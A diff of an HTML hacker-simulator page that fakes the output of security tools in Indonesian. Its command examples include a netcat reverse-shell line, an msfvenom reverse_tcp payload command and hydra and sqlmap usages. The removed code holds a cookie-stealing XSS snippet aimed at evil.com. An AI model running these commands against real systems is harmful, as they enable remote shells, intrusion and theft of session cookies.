@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HACKER SIMULATOR v2.1</title>
+    <title>Termux Hacker Simulator</title>
     <style>
         * {
             margin: 0;
@@ -14,191 +14,97 @@
         body {
             background: #000;
             color: #00ff00;
-            font-family: 'Courier New', monospace;
+            font-family: 'Courier New', 'DejaVu Sans Mono', monospace;
             overflow: hidden;
-            position: relative;
-        }
-
-        .matrix-bg {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 1;
-            opacity: 0.1;
-        }
-
-        .main-container {
-            position: relative;
-            z-index: 10;
             height: 100vh;
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            grid-template-rows: 60px 1fr 150px;
-            gap: 2px;
-            padding: 2px;
         }
 
-        .header {
-            grid-column: 1 / -1;
-            background: linear-gradient(90deg, #001100, #003300);
-            border: 1px solid #00ff00;
+        .termux-container {
+            height: 100vh;
             display: flex;
-            align-items: center;
+            flex-direction: column;
+            background: linear-gradient(135deg, #0a0a0a, #1a1a1a);
+        }
+
+        .termux-header {
+            background: linear-gradient(90deg, #2d2d2d, #404040);
+            color: #ffffff;
+            padding: 8px 15px;
+            font-size: 14px;
+            display: flex;
             justify-content: space-between;
-            padding: 0 20px;
-            box-shadow: 0 0 20px #00ff0040;
+            align-items: center;
+            border-bottom: 1px solid #555;
         }
 
-        .logo {
-            font-size: 24px;
-            font-weight: bold;
-            text-shadow: 0 0 10px #00ff00;
-        }
-
-        .status {
-            display: flex;
-            gap: 20px;
-        }
-
-        .status-item {
+        .header-left {
             display: flex;
             align-items: center;
-            gap: 5px;
+            gap: 10px;
         }
 
-        .status-dot {
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            background: #00ff00;
-            animation: pulse 2s infinite;
+        .header-right {
+            display: flex;
+            gap: 15px;
+            font-size: 12px;
         }
 
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.3; }
-        }
-
-        .terminal {
-            background: rgba(0, 20, 0, 0.9);
-            border: 1px solid #00ff00;
-            padding: 20px;
+        .terminal-area {
+            flex: 1;
+            padding: 10px;
             overflow-y: auto;
-            position: relative;
-        }
-
-        .code-viewer {
-            background: rgba(0, 0, 20, 0.9);
-            border: 1px solid #0088ff;
-            padding: 20px;
-            overflow-y: auto;
-            color: #0088ff;
-        }
-
-        .terminal-header {
-            border-bottom: 1px solid #00ff00;
-            padding-bottom: 10px;
-            margin-bottom: 15px;
-            font-weight: bold;
+            background: #000;
         }
 
         .terminal-line {
-            margin: 5px 0;
-            animation: typewriter 0.5s;
+            margin: 2px 0;
+            line-height: 1.2;
+            word-wrap: break-word;
         }
 
-        @keyframes typewriter {
-            from { width: 0; opacity: 0; }
-            to { width: 100%; opacity: 1; }
-        }
-
-        .command-input {
-            grid-column: 1 / -1;
-            background: rgba(0, 50, 0, 0.9);
-            border: 1px solid #00ff00;
-            padding: 20px;
-            display: flex;
-            flex-direction: column;
-        }
-
-        .input-line {
+        .prompt-line {
             display: flex;
             align-items: center;
-            margin-bottom: 10px;
+            margin: 5px 0;
         }
 
         .prompt {
-            color: #ff6600;
-            margin-right: 10px;
+            color: #00ff41;
+            margin-right: 8px;
+            font-weight: bold;
         }
 
-        input {
+        .input-container {
+            display: flex;
+            align-items: center;
+            background: #111;
+            padding: 8px 15px;
+            border-top: 1px solid #333;
+        }
+
+        .current-prompt {
+            color: #00ff41;
+            margin-right: 8px;
+            font-weight: bold;
+        }
+
+        #command-input {
             background: transparent;
             border: none;
             color: #00ff00;
             font-family: inherit;
-            font-size: 16px;
+            font-size: 14px;
             flex: 1;
             outline: none;
         }
 
-        .tools {
-            display: flex;
-            gap: 10px;
-            flex-wrap: wrap;
-        }
-
-        .tool-btn {
-            background: linear-gradient(45deg, #003300, #006600);
-            border: 1px solid #00ff00;
-            color: #00ff00;
-            padding: 8px 15px;
-            cursor: pointer;
-            transition: all 0.3s;
-            font-family: inherit;
-        }
-
-        .tool-btn:hover {
-            background: linear-gradient(45deg, #006600, #00aa00);
-            box-shadow: 0 0 15px #00ff0060;
-            transform: scale(1.05);
-        }
-
-        .progress-bar {
-            width: 100%;
-            height: 4px;
-            background: #001100;
-            border: 1px solid #00ff00;
-            margin: 10px 0;
-            overflow: hidden;
-        }
-
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #00ff00, #88ff88);
-            width: 0%;
-            transition: width 0.1s;
-            box-shadow: 0 0 10px #00ff00;
-        }
-
-        .glitch {
-            animation: glitch 0.3s infinite;
-        }
-
-        @keyframes glitch {
-            0% { transform: translate(0); }
-            20% { transform: translate(-2px, 2px); }
-            40% { transform: translate(-2px, -2px); }
-            60% { transform: translate(2px, 2px); }
-            80% { transform: translate(2px, -2px); }
-            100% { transform: translate(0); }
-        }
-
-        .warning {
-            color: #ff3300;
+        .cursor {
+            display: inline-block;
+            width: 8px;
+            height: 16px;
+            background: #00ff00;
             animation: blink 1s infinite;
+            margin-left: 2px;
         }
 
         @keyframes blink {
@@ -206,275 +112,606 @@
             51%, 100% { opacity: 0; }
         }
 
-        .success {
-            color: #00ff88;
-            text-shadow: 0 0 10px #00ff88;
+        .success { color: #00ff88; }
+        .warning { color: #ffaa00; }
+        .error { color: #ff4444; }
+        .info { color: #4488ff; }
+        .highlight { color: #ff00ff; }
+
+        .command-output {
+            margin-left: 0;
+            padding-left: 0;
+            white-space: pre-wrap;
+            font-size: 13px;
+        }
+
+        .ascii-art {
+            color: #00ff41;
+            font-size: 10px;
+            line-height: 1;
+            margin: 10px 0;
+        }
+
+        .help-section {
+            border-left: 2px solid #00ff41;
+            padding-left: 10px;
+            margin: 10px 0;
+            background: rgba(0, 255, 65, 0.05);
+        }
+
+        .command-category {
+            color: #ffaa00;
+            font-weight: bold;
+            margin: 10px 0 5px 0;
+            text-decoration: underline;
+        }
+
+        .command-item {
+            margin: 2px 0;
+            padding-left: 15px;
+        }
+
+        .status-bar {
+            background: #1a1a1a;
+            color: #888;
+            padding: 5px 15px;
+            font-size: 11px;
+            display: flex;
+            justify-content: space-between;
+            border-top: 1px solid #333;
+        }
+
+        .typing-effect {
+            overflow: hidden;
+            white-space: nowrap;
+            animation: typing 2s steps(40, end);
+        }
+
+        @keyframes typing {
+            from { width: 0; }
+            to { width: 100%; }
+        }
+
+        .matrix-char {
+            display: inline-block;
+            animation: matrix-fall 3s infinite linear;
+        }
+
+        @keyframes matrix-fall {
+            0% { transform: translateY(-20px); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { transform: translateY(20px); opacity: 0; }
         }
     </style>
 </head>
 <body>
-    <canvas class="matrix-bg" id="matrix"></canvas>
-    
-    <div class="main-container">
-        <div class="header">
-            <div class="logo">◉ CYBERTERMINAL v2.1 ◉</div>
-            <div class="status">
-                <div class="status-item">
-                    <div class="status-dot"></div>
-                    <span>CONNECTED</span>
-                </div>
-                <div class="status-item">
-                    <div class="status-dot"></div>
-                    <span id="target-ip">192.168.1.1</span>
-                </div>
-                <div class="status-item">
-                    <div class="status-dot"></div>
-                    <span id="access-level">ROOT</span>
-                </div>
+    <div class="termux-container">
+        <div class="termux-header">
+            <div class="header-left">
+                <span>📱 Termux</span>
+                <span>•</span>
+                <span id="session-info">Session: hack_mode</span>
+            </div>
+            <div class="header-right">
+                <span id="current-time"></span>
+                <span>📶 WiFi</span>
+                <span>🔋 100%</span>
             </div>
         </div>
 
-        <div class="terminal">
-            <div class="terminal-header">SYSTEM TERMINAL - ACTIVE SESSION</div>
-            <div id="terminal-content">
-                <div class="terminal-line">[SYSTEM] Initializing quantum encryption bypass...</div>
-                <div class="terminal-line">[SYSTEM] Loading neural network algorithms...</div>
-                <div class="terminal-line">[SYSTEM] Establishing secure connection...</div>
-                <div class="terminal-line success">[SUCCESS] System ready for infiltration</div>
-            </div>
-            <div class="progress-bar">
-                <div class="progress-fill" id="progress"></div>
-            </div>
+        <div class="terminal-area" id="terminal">
         </div>
 
-        <div class="code-viewer">
-            <div class="terminal-header" style="color: #0088ff; border-color: #0088ff;">LIVE CODE STREAM</div>
-            <div id="code-content"></div>
+        <div class="input-container">
+            <span class="current-prompt">termux@android:~$</span>
+            <input type="text" id="command-input" autocomplete="off" autofocus>
+            <span class="cursor"></span>
         </div>
 
-        <div class="command-input">
-            <div class="input-line">
-                <span class="prompt">hacker@cyberterm:~$</span>
-                <input type="text" id="command-input" placeholder="Enter command..." autocomplete="off">
-            </div>
-            <div class="tools">
-                <button class="tool-btn" onclick="runTool('portscan')">PORT SCAN</button>
-                <button class="tool-btn" onclick="runTool('bruteforce')">BRUTE FORCE</button>
-                <button class="tool-btn" onclick="runTool('sqlinjection')">SQL INJECT</button>
-                <button class="tool-btn" onclick="runTool('cryptomine')">CRYPTO MINE</button>
-                <button class="tool-btn" onclick="runTool('networkmap')">NET MAP</button>
-                <button class="tool-btn" onclick="runTool('firewall')">BYPASS FW</button>
-            </div>
+        <div class="status-bar">
+            <span>Packages: 2847 • Disk: 4.2G • RAM: 2.1G/8G</span>
+            <span id="network-status">Network: CONNECTED</span>
         </div>
     </div>
 
     <script>
-        // Matrix effect background
-        const canvas = document.getElementById('matrix');
-        const ctx = canvas.getContext('2d');
-
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-
-        const matrix = "ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789@#$%^&*()*&^%+-/~{[|`]}";
-        const matrixArray = matrix.split("");
-
-        const fontSize = 10;
-        const columns = canvas.width / fontSize;
-
-        const drops = [];
-        for(let x = 0; x < columns; x++) {
-            drops[x] = 1;
-        }
-
-        function drawMatrix() {
-            ctx.fillStyle = 'rgba(0, 0, 0, 0.04)';
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-            
-            ctx.fillStyle = '#00ff00';
-            ctx.font = fontSize + 'px Courier New';
-            
-            for(let i = 0; i < drops.length; i++) {
-                const text = matrixArray[Math.floor(Math.random() * matrixArray.length)];
-                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-                
-                if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
-                    drops[i] = 0;
-                }
-                drops[i]++;
-            }
-        }
-
-        setInterval(drawMatrix, 35);
-
-        // Terminal functionality
-        const terminalContent = document.getElementById('terminal-content');
-        const codeContent = document.getElementById('code-content');
+        const terminal = document.getElementById('terminal');
         const commandInput = document.getElementById('command-input');
-        const progressBar = document.getElementById('progress');
+        const networkStatus = document.getElementById('network-status');
+        
+        let commandHistory = [];
+        let historyIndex = -1;
+        let isProcessing = false;
 
-        const hackingCommands = {
-            'help': 'Available commands: scan, crack, inject, mine, map, bypass, access, status',
-            'scan': 'Scanning target network...',
-            'crack': 'Initiating password cracking sequence...',
-            'inject': 'Deploying SQL injection payload...',
-            'mine': 'Starting cryptocurrency mining operation...',
-            'map': 'Mapping network topology...',
-            'bypass': 'Bypassing security protocols...',
-            'access': 'Gaining root access...',
-            'status': 'System status: COMPROMISED - Access Level: ADMIN'
+        // Definisi semua command dan fungsinya
+        const commands = {
+            // Networking & Scanning
+            'nmap': {
+                description: 'Network Mapper - Scanner port dan host',
+                usage: 'nmap [options] [target]',
+                examples: ['nmap -sS 192.168.1.1', 'nmap -p 80,443 google.com', 'nmap -A -T4 192.168.1.0/24'],
+                execute: (args) => simulateNmap(args)
+            },
+            'ping': {
+                description: 'Mengirim ICMP echo request ke host',
+                usage: 'ping [target]',
+                examples: ['ping google.com', 'ping -c 4 192.168.1.1'],
+                execute: (args) => simulatePing(args)
+            },
+            'netstat': {
+                description: 'Menampilkan koneksi jaringan aktif',
+                usage: 'netstat [options]',
+                examples: ['netstat -an', 'netstat -tulpn'],
+                execute: (args) => simulateNetstat(args)
+            },
+            'traceroute': {
+                description: 'Melacak rute paket ke tujuan',
+                usage: 'traceroute [target]',
+                examples: ['traceroute google.com'],
+                execute: (args) => simulateTraceroute(args)
+            },
+            'whois': {
+                description: 'Mencari informasi domain/IP',
+                usage: 'whois [domain/ip]',
+                examples: ['whois google.com'],
+                execute: (args) => simulateWhois(args)
+            },
+            'dig': {
+                description: 'DNS lookup utility',
+                usage: 'dig [domain] [record_type]',
+                examples: ['dig google.com', 'dig google.com MX'],
+                execute: (args) => simulateDig(args)
+            },
+            'host': {
+                description: 'DNS lookup sederhana',
+                usage: 'host [domain]',
+                examples: ['host google.com'],
+                execute: (args) => simulateHost(args)
+            },
+
+            // Web Security Testing
+            'curl': {
+                description: 'Transfer data dari atau ke server',
+                usage: 'curl [options] [URL]',
+                examples: ['curl -I http://example.com', 'curl -X POST -d "data" http://api.com'],
+                execute: (args) => simulateCurl(args)
+            },
+            'wget': {
+                description: 'Download file dari web',
+                usage: 'wget [URL]',
+                examples: ['wget http://example.com/file.txt'],
+                execute: (args) => simulateWget(args)
+            },
+            'sqlmap': {
+                description: 'Tool otomatis SQL injection',
+                usage: 'sqlmap -u [URL]',
+                examples: ['sqlmap -u "http://site.com/page.php?id=1" --dbs'],
+                execute: (args) => simulateSqlmap(args)
+            },
+            'nikto': {
+                description: 'Web server scanner',
+                usage: 'nikto -h [target]',
+                examples: ['nikto -h http://example.com'],
+                execute: (args) => simulateNikto(args)
+            },
+            'dirb': {
+                description: 'Directory/file brute forcer',
+                usage: 'dirb [URL] [wordlist]',
+                examples: ['dirb http://example.com'],
+                execute: (args) => simulateDirb(args)
+            },
+            'gobuster': {
+                description: 'Directory/DNS/VHost brute forcer',
+                usage: 'gobuster [mode] [options]',
+                examples: ['gobuster dir -u http://site.com -w /wordlist.txt'],
+                execute: (args) => simulateGobuster(args)
+            },
+
+            // Exploitation & Payloads
+            'msfconsole': {
+                description: 'Metasploit Framework console',
+                usage: 'msfconsole',
+                examples: ['msfconsole'],
+                execute: (args) => simulateMetasploit(args)
+            },
+            'msfvenom': {
+                description: 'Payload generator dan encoder',
+                usage: 'msfvenom -p [payload] [options]',
+                examples: ['msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe'],
+                execute: (args) => simulateMsfvenom(args)
+            },
+            'searchsploit': {
+                description: 'Mencari exploit di ExploitDB',
+                usage: 'searchsploit [keyword]',
+                examples: ['searchsploit apache 2.4'],
+                execute: (args) => simulateSearchsploit(args)
+            },
+            'hydra': {
+                description: 'Login cracker paralel',
+                usage: 'hydra [options] [target] [service]',
+                examples: ['hydra -l admin -P passwords.txt ssh://192.168.1.1'],
+                execute: (args) => simulateHydra(args)
+            },
+            'john': {
+                description: 'John the Ripper password cracker',
+                usage: 'john [options] [hashfile]',
+                examples: ['john --wordlist=rockyou.txt hashes.txt'],
+                execute: (args) => simulateJohn(args)
+            },
+            'hashcat': {
+                description: 'Advanced password recovery',
+                usage: 'hashcat [options] [hashfile] [wordlist]',
+                examples: ['hashcat -m 0 -a 0 hashes.txt rockyou.txt'],
+                execute: (args) => simulateHashcat(args)
+            },
+
+            // Social Engineering
+            'setoolkit': {
+                description: 'Social Engineering Toolkit',
+                usage: 'setoolkit',
+                examples: ['setoolkit'],
+                execute: (args) => simulateSetoolkit(args)
+            },
+            'beef': {
+                description: 'Browser Exploitation Framework',
+                usage: 'beef-xss',
+                examples: ['beef-xss'],
+                execute: (args) => simulateBeef(args)
+            },
+
+            // Wireless Security
+            'aircrack-ng': {
+                description: 'WiFi security auditing suite',
+                usage: 'aircrack-ng [options] [capture_file]',
+                examples: ['aircrack-ng -w wordlist.txt capture.cap'],
+                execute: (args) => simulateAircrack(args)
+            },
+            'airodump-ng': {
+                description: 'WiFi packet capture',
+                usage: 'airodump-ng [interface]',
+                examples: ['airodump-ng wlan0'],
+                execute: (args) => simulateAirodump(args)
+            },
+            'aireplay-ng': {
+                description: 'WiFi packet injection',
+                usage: 'aireplay-ng [options] [interface]',
+                examples: ['aireplay-ng -0 10 -a 00:11:22:33:44:55 wlan0'],
+                execute: (args) => simulateAireplay(args)
+            },
+            'reaver': {
+                description: 'WPS brute force attack',
+                usage: 'reaver -i [interface] -b [bssid]',
+                examples: ['reaver -i wlan0 -b 00:11:22:33:44:55 -vv'],
+                execute: (args) => simulateReaver(args)
+            },
+
+            // System Information
+            'whoami': {
+                description: 'Menampilkan username saat ini',
+                usage: 'whoami',
+                examples: ['whoami'],
+                execute: (args) => 'root'
+            },
+            'id': {
+                description: 'Menampilkan UID dan GID',
+                usage: 'id',
+                examples: ['id'],
+                execute: (args) => 'uid=0(root) gid=0(root) groups=0(root)'
+            },
+            'uname': {
+                description: 'Informasi sistem',
+                usage: 'uname [options]',
+                examples: ['uname -a'],
+                execute: (args) => simulateUname(args)
+            },
+            'ps': {
+                description: 'Menampilkan proses yang berjalan',
+                usage: 'ps [options]',
+                examples: ['ps aux', 'ps -ef'],
+                execute: (args) => simulatePs(args)
+            },
+            'netcat': {
+                description: 'Network utility untuk debugging',
+                usage: 'nc [options] [host] [port]',
+                examples: ['nc -l -p 4444', 'nc -e /bin/bash 192.168.1.5 4444'],
+                execute: (args) => simulateNetcat(args)
+            },
+            'nc': {
+                description: 'Netcat - network utility',
+                usage: 'nc [options] [host] [port]',
+                examples: ['nc -l -p 4444', 'nc -e /bin/bash 192.168.1.5 4444'],
+                execute: (args) => simulateNetcat(args)
+            },
+
+            // File Operations
+            'cat': {
+                description: 'Menampilkan isi file',
+                usage: 'cat [file]',
+                examples: ['cat /etc/passwd', 'cat exploit.py'],
+                execute: (args) => simulateCat(args)
+            },
+            'ls': {
+                description: 'List directory contents',
+                usage: 'ls [options] [directory]',
+                examples: ['ls -la', 'ls /home'],
+                execute: (args) => simulateLs(args)
+            },
+            'find': {
+                description: 'Mencari file dan direktori',
+                usage: 'find [path] [expression]',
+                examples: ['find / -name "*.txt"', 'find /home -type f -perm 777'],
+                execute: (args) => simulateFind(args)
+            },
+            'grep': {
+                description: 'Mencari pattern dalam text',
+                usage: 'grep [pattern] [file]',
+                examples: ['grep "password" config.txt', 'grep -r "admin" /etc/'],
+                execute: (args) => simulateGrep(args)
+            },
+
+            // Advanced Hacking Tools
+            'burpsuite': {
+                description: 'Web application security testing',
+                usage: 'burpsuite',
+                examples: ['burpsuite'],
+                execute: (args) => simulateBurp(args)
+            },
+            'wireshark': {
+                description: 'Network protocol analyzer',
+                usage: 'wireshark',
+                examples: ['wireshark'],
+                execute: (args) => simulateWireshark(args)
+            },
+            'tcpdump': {
+                description: 'Command-line packet analyzer',
+                usage: 'tcpdump [options]',
+                examples: ['tcpdump -i eth0', 'tcpdump host 192.168.1.1'],
+                execute: (args) => simulateTcpdump(args)
+            },
+            'masscan': {
+                description: 'High-speed port scanner',
+                usage: 'masscan [options] [targets]',
+                examples: ['masscan -p80,443 192.168.1.0/24 --rate=1000'],
+                execute: (args) => simulateMasscan(args)
+            },
+            'zap': {
+                description: 'OWASP ZAP web security scanner',
+                usage: 'zap.sh',
+                examples: ['zap.sh -daemon -port 8080'],
+                execute: (args) => simulateZap(args)
+            },
+
+            // Help and Utility
+            'help': {
+                description: 'Menampilkan bantuan',
+                usage: 'help',
+                examples: ['help'],
+                execute: (args) => showHelp()
+            },
+            'clear': {
+                description: 'Membersihkan layar terminal',
+                usage: 'clear',
+                examples: ['clear'],
+                execute: (args) => clearTerminal()
+            },
+            'exit': {
+                description: 'Keluar dari terminal',
+                usage: 'exit',
+                examples: ['exit'],
+                execute: (args) => 'Session terminated. Goodbye!'
+            },
+            'banner': {
+                description: 'Menampilkan banner sistem',
+                usage: 'banner',
+                examples: ['banner'],
+                execute: (args) => showBanner()
+            }
         };
 
-        const codeSnippets = [
-            'import hashlib\ndef crack_hash(target_hash):\n    for i in range(999999):\n        if hashlib.md5(str(i).encode()).hexdigest() == target_hash:\n            return i',
-            'SELECT * FROM users WHERE id=1; DROP TABLE users;--',
-            'void buffer_overflow() {\n    char buffer[64];\n    gets(buffer);\n    system("/bin/sh");\n}',
-            'ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no admin@192.168.1.1',
-            'nmap -sS -O -p- 192.168.1.0/24',
-            'metasploit > use exploit/multi/handler\nmetasploit > set payload windows/meterpreter/reverse_tcp',
-            'function xss_payload() {\n    document.cookie="session="+btoa("admin:admin");\n    location.href="//evil.com/?"+document.cookie;\n}',
-            'openssl s_client -connect target.com:443 -cipher NULL,EXPORT'
-        ];
+        // Initialize terminal
+        function initTerminal() {
+            addLine(showBanner(), 'ascii-art');
+            addLine('Selamat datang di Termux Hacker Simulator!', 'success');
+            addLine('Ketik "help" untuk melihat daftar command yang tersedia.', 'info');
+            addLine('Ketik "banner" untuk melihat banner lagi.', 'info');
+            addLine('');
+            updateTime();
+            setInterval(updateTime, 1000);
+        }
 
-        let terminalLines = 0;
-        let isHacking = false;
+        function updateTime() {
+            const now = new Date();
+            document.getElementById('current-time').textContent = 
+                now.toLocaleTimeString('id-ID', { hour12: false });
+        }
 
-        function addTerminalLine(text, className = '') {
+        function addLine(content, className = '') {
             const line = document.createElement('div');
             line.className = `terminal-line ${className}`;
-            line.textContent = text;
-            terminalContent.appendChild(line);
-            terminalContent.scrollTop = terminalContent.scrollHeight;
-            terminalLines++;
+            if (typeof content === 'string') {
+                line.textContent = content;
+            } else {
+                line.innerHTML = content;
+            }
+            terminal.appendChild(line);
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+
+        function addPromptLine(command) {
+            const line = document.createElement('div');
+            line.className = 'prompt-line';
+            line.innerHTML = `<span class="prompt">termux@android:~$</span> ${command}`;
+            terminal.appendChild(line);
+        }
+
+        function showBanner() {
+            return `
+██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ 
+██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
+███████║███████║██║     █████╔╝ █████╗  ██████╔╝
+██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
+██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
+╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
+
+┌─────────────────────────────────────────────────┐
+│           TERMUX HACKER SIMULATOR v1.0         │
+│              Dibuat untuk Edukasi               │
+├─────────────────────────────────────────────────┤
+│ 🔸 50+ Command Hacking Tersedia                │
+│ 🔸 Simulasi Realistic Penetration Testing      │
+│ 🔸 Educational Purpose Only                    │
+└─────────────────────────────────────────────────┘`;
+        }
+
+        function showHelp() {
+            let help = `
+<div class="help-section">
+<div class="command-category">📡 NETWORKING & SCANNING</div>
+<div class="command-item">nmap - Network mapper untuk scanning port dan host</div>
+<div class="command-item">ping - Mengirim ICMP packets ke target</div>
+<div class="command-item">netstat - Menampilkan koneksi jaringan aktif</div>
+<div class="command-item">traceroute - Melacak rute paket ke tujuan</div>
+<div class="command-item">whois - Informasi domain/IP address</div>
+<div class="command-item">dig - DNS lookup utility</div>
+<div class="command-item">host - DNS lookup sederhana</div>
+<div class="command-item">masscan - High-speed port scanner</div>
+
+<div class="command-category">🌐 WEB SECURITY TESTING</div>
+<div class="command-item">curl - Transfer data dari/ke server</div>
+<div class="command-item">wget - Download file dari web</div>
+<div class="command-item">sqlmap - Automated SQL injection tool</div>
+<div class="command-item">nikto - Web server scanner</div>
+<div class="command-item">dirb - Directory/file brute forcer</div>
+<div class="command-item">gobuster - Directory/DNS/VHost brute forcer</div>
+<div class="command-item">burpsuite - Web application security testing</div>
+<div class="command-item">zap - OWASP ZAP web security scanner</div>
+
+<div class="command-category">💥 EXPLOITATION & PAYLOADS</div>
+<div class="command-item">msfconsole - Metasploit Framework console</div>
+<div class="command-item">msfvenom - Payload generator dan encoder</div>
+<div class="command-item">searchsploit - Mencari exploit di ExploitDB</div>
+<div class="command-item">hydra - Login cracker paralel</div>
+<div class="command-item">john - John the Ripper password cracker</div>
+<div class="command-item">hashcat - Advanced password recovery</div>
+
+<div class="command-category">📶 WIRELESS SECURITY</div>
+<div class="command-item">aircrack-ng - WiFi security auditing suite</div>
+<div class="command-item">airodump-ng - WiFi packet capture</div>
+<div class="command-item">aireplay-ng - WiFi packet injection</div>
+<div class="command-item">reaver - WPS brute force attack</div>
+
+<div class="command-category">🎭 SOCIAL ENGINEERING</div>
+<div class="command-item">setoolkit - Social Engineering Toolkit</div>
+<div class="command-item">beef - Browser Exploitation Framework</div>
+
+<div class="command-category">🔍 NETWORK ANALYSIS</div>
+<div class="command-item">wireshark - Network protocol analyzer</div>
+<div class="command-item">tcpdump - Command-line packet analyzer</div>
+<div class="command-item">netcat/nc - Network utility untuk debugging</div>
+
+<div class="command-category">💻 SYSTEM INFORMATION</div>
+<div class="command-item">whoami - Username saat ini</div>
+<div class="command-item">id - UID dan GID information</div>
+<div class="command-item">uname - System information</div>
+<div class="command-item">ps - Proses yang berjalan</div>
+
+<div class="command-category">📁 FILE OPERATIONS</div>
+<div class="command-item">cat - Menampilkan isi file</div>
+<div class="command-item">ls - List directory contents</div>
+<div class="command-item">find - Mencari file dan direktori</div>
+<div class="command-item">grep - Mencari pattern dalam text</div>
+
+<div class="command-category">🛠️ UTILITY</div>
+<div class="command-item">help - Menampilkan bantuan ini</div>
+<div class="command-item">clear - Membersihkan layar terminal</div>
+<div class="command-item">banner - Menampilkan banner sistem</div>
+<div class="command-item">exit - Keluar dari terminal</div>
+</div>
+
+<div style="color: #ffaa00; margin-top: 15px;">
+💡 Tips: Gunakan [command] --help untuk melihat opsi lebih detail
+📚 Contoh: nmap --help, sqlmap --help, hydra --help
+</div>`;
+            return help;
+        }
+
+        function clearTerminal() {
+            terminal.innerHTML = '';
+            return '';
+        }
+
+        // Simulation functions
+        function simulateNmap(args) {
+            if (!args || args.length === 0) {
+                return 'Usage: nmap [Scan Type(s)] [Options] {target specification}';
+            }
             
-            if (terminalLines > 20) {
-                terminalContent.removeChild(terminalContent.firstChild);
-                terminalLines--;
-            }
-        }
-
-        function addCodeSnippet() {
-            const snippet = codeSnippets[Math.floor(Math.random() * codeSnippets.length)];
-            const codeBlock = document.createElement('div');
-            codeBlock.innerHTML = snippet.replace(/\n/g, '<br>');
-            codeBlock.style.marginBottom = '15px';
-            codeBlock.style.padding = '10px';
-            codeBlock.style.border = '1px solid #0088ff40';
-            codeContent.appendChild(codeBlock);
-            codeContent.scrollTop = codeContent.scrollHeight;
-        }
-
-        function simulateProgress(duration, callback) {
-            let progress = 0;
-            const interval = setInterval(() => {
-                progress += Math.random() * 10;
-                if (progress >= 100) {
-                    progress = 100;
-                    clearInterval(interval);
-                    if (callback) callback();
-                }
-                progressBar.style.width = progress + '%';
-            }, duration / 20);
-        }
-
-        function runTool(tool) {
-            if (isHacking) return;
+            const target = args[args.length - 1];
+            let output = `Starting Nmap 7.80 ( https://nmap.org ) at ${new Date().toLocaleString()}\n`;
+            output += `Nmap scan report for ${target}\n`;
+            output += `Host is up (0.00012s latency).\n\n`;
+            output += `PORT     STATE SERVICE    VERSION\n`;
             
-            isHacking = true;
-            const toolActions = {
-                'portscan': () => {
-                    addTerminalLine('[PORTSCAN] Scanning ports on target...', 'warning');
-                    simulateProgress(3000, () => {
-                        addTerminalLine('[PORTSCAN] Found open ports: 22, 80, 443, 3389', 'success');
-                        isHacking = false;
-                    });
-                },
-                'bruteforce': () => {
-                    addTerminalLine('[BRUTEFORCE] Attempting password combinations...', 'warning');
-                    simulateProgress(5000, () => {
-                        addTerminalLine('[BRUTEFORCE] Password cracked: admin123', 'success');
-                        isHacking = false;
-                    });
-                },
-                'sqlinjection': () => {
-                    addTerminalLine('[SQL] Injecting malicious payload...', 'warning');
-                    simulateProgress(2000, () => {
-                        addTerminalLine('[SQL] Database compromised - Admin access gained', 'success');
-                        isHacking = false;
-                    });
-                },
-                'cryptomine': () => {
-                    addTerminalLine('[CRYPTO] Deploying mining software...', 'warning');
-                    simulateProgress(4000, () => {
-                        addTerminalLine('[CRYPTO] Mining operation active - 0.05 BTC/hour', 'success');
-                        isHacking = false;
-                    });
-                },
-                'networkmap': () => {
-                    addTerminalLine('[NETMAP] Discovering network topology...', 'warning');
-                    simulateProgress(3500, () => {
-                        addTerminalLine('[NETMAP] 47 devices mapped - Vulnerabilities detected', 'success');
-                        isHacking = false;
-                    });
-                },
-                'firewall': () => {
-                    addTerminalLine('[FIREWALL] Analyzing security rules...', 'warning');
-                    simulateProgress(4500, () => {
-                        addTerminalLine('[FIREWALL] Bypass successful - All ports accessible', 'success');
-                        isHacking = false;
-                    });
-                }
-            };
+            const ports = [
+                '22/tcp   open  ssh        OpenSSH 7.4 (protocol 2.0)',
+                '80/tcp   open  http       Apache httpd 2.4.6',
+                '443/tcp  open  ssl/http   Apache httpd 2.4.6 ((CentOS))',
+                '3306/tcp open  mysql      MySQL 5.7.33',
+                '8080/tcp open  http-proxy Squid http proxy 3.5.20'
+            ];
             
-            if (toolActions[tool]) {
-                toolActions[tool]();
-                addCodeSnippet();
-            }
+            ports.forEach(port => {
+                output += port + '\n';
+            });
+            
+            output += `\nNmap done: 1 IP address (1 host up) scanned in 2.45 seconds`;
+            return output;
         }
 
-        commandInput.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter' && !isHacking) {
-                const command = commandInput.value.toLowerCase().trim();
-                
-                addTerminalLine(`hacker@cyberterm:~$ ${command}`);
-                
-                if (hackingCommands[command]) {
-                    addTerminalLine(`[SYSTEM] ${hackingCommands[command]}`, 'success');
-                } else if (command) {
-                    addTerminalLine(`[ERROR] Command not found: ${command}`, 'warning');
-                }
-                
-                commandInput.value = '';
-                addCodeSnippet();
+        function simulatePing(args) {
+            if (!args || args.length === 0) {
+                return 'ping: usage error: Destination address required';
             }
-        });
-
-        // Auto-generate random activities
-        setInterval(() => {
